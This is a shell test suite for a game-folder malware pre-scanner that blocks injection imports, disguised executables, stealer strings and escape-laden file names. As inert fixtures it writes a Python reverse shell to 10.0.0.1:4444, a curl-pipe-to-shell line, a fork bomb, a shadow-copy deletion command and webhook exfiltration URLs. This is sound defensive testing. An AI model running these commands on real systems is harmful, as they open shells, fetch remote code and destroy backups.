#!/bin/bash
# Tests for the pre-launch scan (wq-prescan.sh + wq-prescan.py).
# No firejail or ClamAV needed: clamscan is replaced by a stub, executables are built by hand.
#   bash wq-ui/test_prescan.sh
set -u
unset WQ_PRESCAN WQ_PRESCAN_ALLOW
SRC="$(cd "$(dirname "$(readlink -f "$0")")/.." && pwd)"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); }
fail() { FAIL=$((FAIL+1)); echo "FAIL: $1"; [ -n "${2:-}" ] && echo "      $2"; }
eq()   { [ "$2" = "$3" ] && ok || fail "$1" "expected [$2] got [$3]"; }
has()  { grep -qE -- "$2" <<< "$3" && ok || fail "$1" "no match for /$2/ in: $(head -c 400 <<< "$3")"; }
hasnt(){ grep -qE -- "$2" <<< "$3" && fail "$1" "unexpected match /$2/ in: $(head -c 400 <<< "$3")" || ok; }

Q="$T/q"; mkdir -p "$Q"; . "$(dirname "$(readlink -f "$0")")/test_lib.sh"; wq_copy_src "$SRC" "$Q"
mkgame() {  # mkgame <name> <exe>
  mkdir -p "$Q/$1/game" "$Q/$1/logs"; printf 'EXE=%s\n' "${2:-a.exe}" > "$Q/$1/game.conf"
}
# YARA and capa are not under test here (test_yara_scan.sh and test_external_analyzers.sh are); switched on
# but not installed they would refuse every launch
export YARA_SCAN=0 CAPA_SCAN=0
pre() { "$Q/wq-prescan.sh" "$@" 2>&1 | sed 's/\x1b\[[0-9;]*m//g'; return "${PIPESTATUS[0]}"; }

# a minimal 64-bit PE: mkpe <out> <comma separated section names> <dll=Func,Func;dll=Func> [hot]
cat > "$T/mkpe.py" <<'PY'
import os, struct, sys
out, names, imps = sys.argv[1], sys.argv[2].split(","), sys.argv[3]
hot = len(sys.argv) > 4
imports = {k: v.split(",") for k, v in (x.split("=") for x in imps.split(";"))}
nsec = len(names) + 1
SP = 0x21000
base = SP * nsec
idata = bytearray((len(imports) + 1) * 20)
for i, (dll, funcs) in enumerate(imports.items()):
    tbl = len(idata); idata += b"\0" * ((len(funcs) + 1) * 8)
    hn = []
    for f in funcs:
        hn.append(len(idata)); idata += b"\0\0" + f.encode() + b"\0"
    dn = len(idata); idata += dll.encode() + b"\0"
    for j, o in enumerate(hn):
        struct.pack_into("<Q", idata, tbl + j * 8, base + o)
    struct.pack_into("<IIIII", idata, i * 20, base + tbl, 0, 0, base + dn, base + tbl)
opt = bytearray(240)
struct.pack_into("<H", opt, 0, 0x20B); struct.pack_into("<I", opt, 108, 16)
struct.pack_into("<II", opt, 120, base, len(idata))
hdrs, raw, ptr = b"", b"", 0x400
for i, n in enumerate(names):
    data = os.urandom(0x20000) if hot else b"\x90" * 0x20000
    hdrs += n.encode().ljust(8, b"\0") + struct.pack("<IIIIIIHHI", 0x20000, SP * (i + 1), 0x20000, ptr, 0, 0, 0, 0, 0x60000020)
    raw += data; ptr += 0x20000
ib = bytes(idata).ljust(0x200, b"\0")
hdrs += b".idata\0\0" + struct.pack("<IIIIIIHHI", len(idata), base, len(ib), ptr, 0, 0, 0, 0, 0x40000040)
raw += ib
dos = bytearray(64); dos[:2] = b"MZ"; struct.pack_into("<I", dos, 0x3C, 64)
pe = bytes(dos) + b"PE\0\0" + struct.pack("<HHIIIHH", 0x8664, nsec, 0, 0, 0, len(opt), 0x22) + bytes(opt) + hdrs
open(out, "wb").write(pe.ljust(0x400, b"\0") + raw)
PY
mkpe() { python3 "$T/mkpe.py" "$@"; }

STUB="$T/clamscan"; cat > "$STUB" <<'EOS'
#!/bin/bash
for a in "$@"; do case "$a" in --file-list=*) L="${a#--file-list=}" ;; esac; done
n=0; bad=0
while IFS= read -r f; do n=$((n+1)); if grep -q EICAR-TEST "$f" 2>/dev/null; then echo "$f: Eicar-Test-Signature FOUND"; bad=$((bad+1)); fi; done < "$L"
echo "Scanned files: $n"; [ "$bad" -gt 0 ] && exit 1; exit 0
EOS
chmod +x "$STUB"
DB="$T/db"; mkdir -p "$DB"; touch "$DB/main.cvd"
export CLAM_BIN="$STUB" CLAM_DB_DIR="$DB" CLAM_SANDBOX=0 CLAM_SCAN_AFTER_RUN=1

echo "== static checks"
mkgame clean; mkpe "$Q/clean/game/a.exe" .text,.data "kernel32.dll=CreateFileA,ReadFile;user32.dll=MessageBoxA"
mkpe "$Q/clean/game/overlay.dll" .text "kernel32.dll=WriteProcessMemory,ReadProcessMemory,OpenProcess"
out="$(pre clean)"; rc=$?; eq "clean game passes" 0 "$rc"; has "clean game says so" 'nothing suspicious' "$out"
hasnt "one process-memory import is not injection" 'inject' "$out"

mkgame inj; mkpe "$Q/inj/game/a.exe" .text "kernel32.dll=WriteProcessMemory,CreateRemoteThread,VirtualAllocEx"
out="$(pre inj)"; rc=$?; eq "injection alone scores 3: launch allowed" 0 "$rc"; has "injection is reported" 'injecting code' "$out"
mkgame inj2; mkpe "$Q/inj2/game/a.exe" .text "kernel32.dll=WriteProcessMemory,CreateRemoteThread,VirtualAllocEx,CreateProcessA;urlmon.dll=URLDownloadToFileA"
out="$(pre inj2)"; rc=$?; eq "injection + downloader is refused" 1 "$rc"; has "refusal says why" 'refusing to launch.*risk score' "$out"
has "refusal is an ALERT in the log" 'ALERT.*Launch refused' "$(cat "$Q"/inj2/logs/alerts-*-prescan.log)"

mkgame packed; mkpe "$Q/packed/game/a.exe" .text "kernel32.dll=LoadLibraryA,GetProcAddress" hot
out="$(pre packed)"; has "random-looking code is flagged as packed" 'packed or encrypted' "$out"
mkgame net; mkpe "$Q/net/game/a.exe" .text "mscoree.dll=_CorExeMain"
out="$(pre net)"; rc=$?; eq ".NET Framework program is not blocked" 0 "$rc"; has ".NET Framework program gets a Mono note" '\.NET Framework program.*Mono' "$out"
hasnt "plain .NET is not called obfuscated" 'encrypted/compressed code' "$out"
mkgame netp; mkpe "$Q/netp/game/a.exe" .text "mscoree.dll=_CorExeMain" hot
out="$(pre netp)"; rc=$?; eq "protected .NET alone does not block" 0 "$rc"; has "protected .NET is called out" 'encrypted/compressed code.*obfuscated' "$out"
hasnt ".NET is not reported as generic packed code" 'looks packed or encrypted' "$out"
mkgame upx; mkpe "$Q/upx/game/a.exe" UPX0,UPX1 "kernel32.dll=LoadLibraryA"
out="$(pre upx)"; rc=$?; has "UPX is a note" 'UPX-packed' "$out"; eq "UPX alone does not block" 0 "$rc"

mkgame dis; cp "$Q/clean/game/a.exe" "$Q/dis/game/readme.txt"; cp "$Q/clean/game/a.exe" "$Q/dis/game/invoice.pdf.exe"
out="$(pre dis)"; rc=$?; has "exe named .txt" 'readme\.txt' "$out"; has "double extension" 'invoice\.pdf\.exe' "$out"; eq "disguised programs block" 1 "$rc"
mkgame png; printf '\x89PNG\r\n\x1a\n' > "$Q/png/game/logo.png"; out="$(pre png)"; eq "a real png is fine" 0 "$?"

mkgame sh a.sh; printf '#!/bin/bash\ncurl http://x/y.sh | sh\necho hi >> ~/.bashrc\n' > "$Q/sh/game/a.sh"
out="$(pre sh)"; rc=$?; eq "download-into-shell + .bashrc is refused" 1 "$rc"
mkgame sh2 start.sh; printf '#!/bin/bash\ncd "$(dirname "$0")"\nexec ./game.x86_64\n' > "$Q/sh2/game/start.sh"
out="$(pre sh2)"; eq "an ordinary launcher script is fine" 0 "$?"
mkgame big a.exe; for i in $(seq 1 3000); do : > "$Q/big/game/f$i.dat"; done; cp "$Q/clean/game/a.exe" "$Q/big/game/a.exe"
out="$(pre big)"; eq "thousands of files are fine" 0 "$?"

echo "== indicators (strings inside programs, ASCII and UTF-16)"
u16() { printf '%s' "$1" | iconv -f UTF-8 -t UTF-16LE; }
mkgame ind1; cp "$Q/clean/game/a.exe" "$Q/ind1/game/a.exe"; printf 'https://discord.com/api/webhooks/123/abc' >> "$Q/ind1/game/a.exe"
out="$(pre ind1)"; rc=$?; eq "a webhook URL alone is a warning, not a block" 0 "$rc"; has "webhook is reported" 'web service often used to receive stolen data' "$out"
mkgame ind2; cp "$Q/clean/game/a.exe" "$Q/ind2/game/a.exe"; { u16 'https://api.telegram.org/bot1:A/sendMessage'; u16 'Google\Chrome\User Data'; u16 'os_crypt'; } >> "$Q/ind2/game/a.exe"
out="$(pre ind2)"; rc=$?; eq "UTF-16 telegram bot + browser stealer strings are refused (3+3)" 1 "$rc"; has "stealer pattern is reported" 'credential-stealer pattern' "$out"
has "the finding names the file" 'a\.exe \[' "$out"
mkgame ind3 a.bat; printf '@echo off\r\npowershell -nop -w hidden -c "iex"\r\nvssadmin delete shadows /all /quiet\r\n' > "$Q/ind3/game/a.bat"
out="$(pre ind3)"; rc=$?; eq "a batch file that hides PowerShell and deletes shadow copies is refused" 1 "$rc"; has "ransomware command reported" 'ransomware wording or commands' "$out"
mkgame ind4; cp "$Q/clean/game/a.exe" "$Q/ind4/game/a.exe"; printf 'Discord Rich Presence, Chrome User Data folder, wine_get_version' >> "$Q/ind4/game/a.exe"
out="$(pre ind4)"; rc=$?; eq "ordinary mentions of discord/chrome/wine do not block" 0 "$rc"; hasnt "and are not reported as stealing" 'stealer' "$out"
mkgame ind5; cp "$Q/clean/game/a.exe" "$Q/ind5/game/a.exe"; cat "$Q/clean/game/a.exe" >> "$Q/ind5/game/a.exe"
out="$(pre ind5)"; has "a program stored inside a program is noted" 'another Windows program is stored' "$out"
mkgame ind6; cp "$Q/clean/game/a.exe" "$Q/ind6/game/a.exe"; printf 'https://discord.com/api/webhooks/123/abc' >> "$Q/ind6/game/a.exe"
out="$(PRESCAN_STRINGS_BUDGET_MB=0 pre ind6)"; hasnt "PRESCAN_STRINGS_BUDGET_MB=0 turns the string scan off" 'stolen data' "$out"

echo "== Linux scripts and programs"
mkgame lx; mkdir -p "$Q/lx/game/bin"
printf 'import socket,subprocess,os\ns=socket.socket()\ns.connect(("10.0.0.1",4444))\nos.dup2(s.fileno(),0)\nsubprocess.call(["/bin/sh","-i"])\n' > "$Q/lx/game/bin/helper.py"
printf 'import base64\nexec(base64.b64decode("aGk="))\n' > "$Q/lx/game/bin/loader.py"
printf '#!/bin/bash\n:(){ :|:& };:\n' > "$Q/lx/game/bin/bomb.sh"; echo 'x=1' > "$Q/lx/game/bin/keylogger_main.lua"
printf 'This payload steals browser passwords.\n' > "$Q/lx/game/README"
out="$(pre lx)"; rc=$?; eq "Linux attack scripts are refused" 1 "$rc"
has "python reverse shell found" 'ind_revshell|opens a raw network socket.*helper\.py' "$out"
has "decode+exec found" 'decodes data and runs it' "$out"
has "fork bomb found" 'fork bomb' "$out"
has "attack-tool file name found" 'named like an attack tool' "$out"
has "self-description in a README found" 'plain words that it is an attack tool' "$out"
mkgame lx2; printf 'import socket\ns=socket.socket()\ns.connect(("example.org",80))\n' > "$Q/lx2/game/net.py"; printf '#!/bin/bash\nexec "$(dirname "$0")/game"\n' > "$Q/lx2/game/run.sh"
out="$(pre lx2)"; eq "an ordinary socket client and launcher are fine" 0 "$?"

echo "== switches"
out="$(WQ_PRESCAN_ALLOW=1 pre inj2)"; rc=$?; eq "PRESCAN_ALLOW=1 lets it through" 0 "$rc"; has "and says what it would have done" 'would have been refused' "$out"
mkgame off; cp "$Q/inj2/game/a.exe" "$Q/off/game/a.exe"; echo PRESCAN=0 >> "$Q/off/game.conf"
out="$(pre off)"; rc=$?; eq "PRESCAN=0 skips" 0 "$rc"; eq "PRESCAN=0 prints nothing" "" "$out"
echo PRESCAN_ALLOW=1 >> "$Q/inj2/game.conf"; out="$(pre inj2)"; eq "PRESCAN_ALLOW=1 in game.conf" 0 "$?"
out="$(WQ_PRESCAN=0 pre inj2)"; eq "WQ_PRESCAN=0 skips everything" "" "$out"

echo "== ClamAV"
mkgame av; echo EICAR-TEST > "$Q/av/game/bad.dat"; cp "$Q/clean/game/a.exe" "$Q/av/game/a.exe"
out="$(pre av)"; rc=$?; eq "a detection refuses the launch" 1 "$rc"; has "detection is named" 'Eicar-Test-Signature' "$out"
out="$(pre av)"; rc=$?; eq "the next launch is refused too (rescanned in full)" 1 "$rc"
rm "$Q/av/game/bad.dat"; out="$(pre av)"; rc=$?; eq "removing the file clears it" 0 "$rc"
touch -d '40 days ago' "$DB/main.cvd"; out="$(pre clean)"; rc=$?
eq "signatures 40 days old refuse the launch" 1 "$rc"; has "and tell you how to fix it" 'freshclam' "$out"
out="$(PRESCAN_DB_BLOCK_DAYS=60 pre clean)"; eq "PRESCAN_DB_BLOCK_DAYS raises the limit" 0 "$?"
touch "$DB/main.cvd"
mkgame enc; cp "$Q/clean/game/a.exe" "$Q/enc/game/a.exe"; echo x > "$Q/enc/game/pw.zip"
cat > "$T/clamscan2" <<'EOS'
#!/bin/bash
echo "$PWD/game/pw.zip: Heuristics.Encrypted.Zip FOUND"; echo "Scanned files: 2"; exit 1
EOS
chmod +x "$T/clamscan2"; out="$(CLAM_BIN="$T/clamscan2" pre enc)"; rc=$?
eq "an encrypted archive is a warning, not a refusal" 0 "$rc"; has "and it is explained" 'password-protected' "$out"
args="$T/args"; cat > "$T/clamscan3" <<EOS
#!/bin/bash
echo "\$@" > "$args"; echo "Scanned files: 1"
EOS
chmod +x "$T/clamscan3"; rm -f "$Q/enc/.clam-stamp"; CLAM_BIN="$T/clamscan3" pre enc >/dev/null
has "clamscan gets the stricter flags" 'alert-encrypted-archive=yes.*detect-pua=yes' "$(cat "$args")"

echo "== hardening: names, crashes, escapes"
# 1. A file name that is not valid UTF-8 used to make wq-prescan.py die at print() on a UTF-8 desktop (strict
#    stdout), before it wrote SCORE; the launcher then read the missing score as 0 and let the game start.
mkgame badname; mkdir -p "$Q/badname/game"
python3 -c 'import os,sys; d=os.fsencode(sys.argv[1]); open(os.path.join(d,b"\xff-invoice.pdf.exe"),"wb").write(b"x"); open(os.path.join(d,b"readme.scr"),"wb").write(b"x")' "$Q/badname/game"
out="$(PYTHONIOENCODING=utf-8:strict pre badname)"; rc=$?
eq "a non-UTF-8 file name does not turn a refusal into a launch" 1 "$rc"; has "it is still scored" 'risk score' "$out"
has "and the odd byte is shown, not lost" 'x[0-9a-f]{2}-invoice' "$out"

# 2. a checker that crashes, exits non-zero or hangs refuses the launch instead of reading as "clean"
cp "$Q/wq-prescan.py" "$T/wq-prescan.py.keep"
printf 'import sys\nsys.exit(1)\n' > "$Q/wq-prescan.py"
out="$(pre clean)"; rc=$?; eq "a crashed static checker refuses the launch" 1 "$rc"; has "and says it was not checked" 'did not finish.*NOT checked' "$out"
printf 'print("SCORE\t0\t")\nimport sys\nsys.exit(2)\n' > "$Q/wq-prescan.py"
out="$(pre clean)"; rc=$?; eq "a score followed by a non-zero exit is not trusted" 1 "$rc"
printf 'import time\ntime.sleep(60)\n' > "$Q/wq-prescan.py"
out="$(PRESCAN_HARD_TIMEOUT=2 pre clean)"; rc=$?; eq "a hung static checker is cut off and refuses the launch" 1 "$rc"; has "the timeout is named" 'timed out after 2s' "$out"
out="$(PRESCAN_HARD_TIMEOUT=2 WQ_PRESCAN_ALLOW=1 pre clean)"; rc=$?; eq "PRESCAN_ALLOW=1 still overrides it (explicit opt-out)" 0 "$rc"
cp "$T/wq-prescan.py.keep" "$Q/wq-prescan.py"
out="$(pre clean)"; rc=$?; eq "the real checker is back and the clean game passes" 0 "$rc"

# 3. literal backslash text in a name must not become a terminal escape (echo -e used to do exactly that)
mkgame esc; mkdir -p "$Q/esc/game"
python3 -c 'import os,sys; open(os.path.join(sys.argv[1], r"x\033]0;PWNED\007\033[2J.pdf.exe"),"wb").write(b"x")' "$Q/esc/game"
raw="$("$Q/wq-prescan.sh" esc 2>&1)"
left="$(printf '%s' "$raw" | sed 's/\x1b\[[0-9;]*m//g' | tr -cd '\033' | wc -c)"
eq "no escape sequence survives from a file name" 0 "$left"
has "the name is still shown as text" 'PWNED' "$(printf '%s' "$raw" | sed 's/\x1b\[[0-9;]*m//g')"

# 4. direction overrides and padded extensions
mkgame rlo; mkdir -p "$Q/rlo/game"
python3 -c 'import os,sys; d=sys.argv[1]; open(os.path.join(d,"photo_\u202egpj.exe"),"wb").write(b"x"); open(os.path.join(d,"menu.pdf          .exe"),"wb").write(b"x")' "$Q/rlo/game"
out="$(pre rlo)"; rc=$?
has "a direction override in a name is flagged" 'hidden or direction-changing' "$out"; has "and made visible" 'U\+202E' "$out"
has "an extension padded with spaces is still a double extension" 'menu\.pdf +\.exe' "$out"; eq "together they refuse the launch" 1 "$rc"
mkgame jp; mkdir -p "$Q/jp/game"; printf 'x' > "$Q/jp/game/日本語のゲーム.dat"
out="$(pre jp)"; rc=$?; eq "ordinary non-ASCII names are not flagged" 0 "$rc"; hasnt "and not reported" 'hidden or direction' "$out"

# 5. the text cleaner and the seccomp list
cl() { bash -c 'source "$1/config.sh" >/dev/null 2>&1; wq_clean_text "$2"' _ "$Q" "$1"; }
eq "cleaner: C0 controls become ?" 'a?[2Jb' "$(cl $'a\033[2Jb')"
eq "cleaner: C1 controls (UTF-8) become ?" 'a?31mb' "$(cl $'a\xc2\x9b31mb')"
eq "cleaner: direction override is marked" 'p<bidi>gpj.exe' "$(cl $'p\xe2\x80\xaegpj.exe')"
eq "cleaner: zero-width and BOM are marked" 'a<hidden>b<hidden>' "$(cl $'a\xe2\x80\x8bb\xef\xbb\xbf')"
eq "cleaner: normal unicode is kept" '日本語 ünï' "$(cl '日本語 ünï')"
sc="$(bash -c 'source "$1/config.sh" >/dev/null 2>&1; echo "$SECCOMP_DROP"' _ "$Q")"
for call in kcmp syslog iopl fanotify_init bpf io_uring_setup keyctl; do has "default seccomp list drops $call" "(^|,)$call(,|$)" "$sc"; done

# 6. firejail runs setuid root: a version with the --join local-root hole (CVE-2022-31214, fixed in 0.9.70) is refused
mkdir -p "$T/fjbin"
fjver() { printf '#!/bin/sh\n[ "$1" = "--version" ] && echo "firejail version %s"\n' "$1" > "$T/fjbin/firejail"; chmod +x "$T/fjbin/firejail"
          PATH="$T/fjbin:$PATH" bash -c 'source "$1/config.sh" >/dev/null 2>&1; LUTRIS_UMU=/bin/true; check_deps 2>&1' _ "$Q"; }
has   "firejail 0.9.68 is refused" 'older than 0.9.70.*CVE-2022-31214' "$(fjver 0.9.68)"
hasnt "firejail 0.9.70 is accepted" 'older than 0.9.70' "$(fjver 0.9.70)"
hasnt "firejail 0.9.72 is accepted" 'older than 0.9.70' "$(fjver 0.9.72)"
printf '#!/bin/sh\nexit 0\n' > "$T/fjbin/firejail"
hasnt "an unreadable version is not an error" 'older than 0.9.70' "$(PATH="$T/fjbin:$PATH" bash -c 'source "$1/config.sh" >/dev/null 2>&1; LUTRIS_UMU=/bin/true; check_deps 2>&1' _ "$Q")"

echo "== hardening 2: invisible text, log read-back, installer"
eq "cleaner: Unicode tag characters are marked" 'a<hidden>b' "$(cl $'a\xf3\xa0\x81\x81b')"
eq "cleaner: Arabic letter mark is marked" 'a<bidi>b' "$(cl $'a\xd8\x9cb')"
eq "cleaner: braille blank is marked" 'a<hidden>b' "$(cl $'a\xe2\xa0\x80b')"
cs() { bash -c 'source "$1/lib-clean.sh"; printf "%b" "$2" | wq_clean_stream' _ "$Q" "$1"; }
eq "stream cleaner keeps lines and tabs" $'a\tb\nc' "$(cs 'a\tb\nc')"
eq "stream cleaner removes ESC and CR" 'a?[2J?b' "$(cs 'a\033[2J\rb')"
# the run summary must not pass terminal escapes from the launch log or alert log to the screen
mkgame sumx; mkdir -p "$Q/sumx/logs"
printf '[2026-01-01 00:00:00] [ALERT] bad \033]0;PWNED\007\033[2J name\xe2\x80\xaegpj\n' > "$T/sum.alert"
printf 'wq: SANDBOX LEAK \033[2J [LEAK] x\n' > "$Q/sumx/logs/launch-20260101-000000.log"
sraw="$("$Q/summarize-run.sh" "$Q/sumx" "$T/sum.alert" 0 2>&1)"
sleft="$(printf '%s' "$sraw" | sed 's/\x1b\[[0-9;]*m//g' | tr -cd '\033\r\007' | wc -c)"
eq "summarize-run shows no escape from the logs" 0 "$sleft"
has "and marks the direction override" '<bidi>' "$sraw"
cb="$(printf 'x\xe2\x80\xaey\n' | WQ_FORCE_COLOR= NO_COLOR=1 "$Q/wq-colorize" 2>&1 | cat)"
eq "wq-colorize passes pipes untouched" $'x\xe2\x80\xaey' "$cb"
# installer: unusual download addresses are refused (static check on the script)
has "installer pins the GitHub release prefix" 'releases/download/' "$(cat "$Q/install.sh")"
has "installer forces https for curl" "proto '=https'" "$(cat "$Q/install.sh")"

echo
echo "$PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
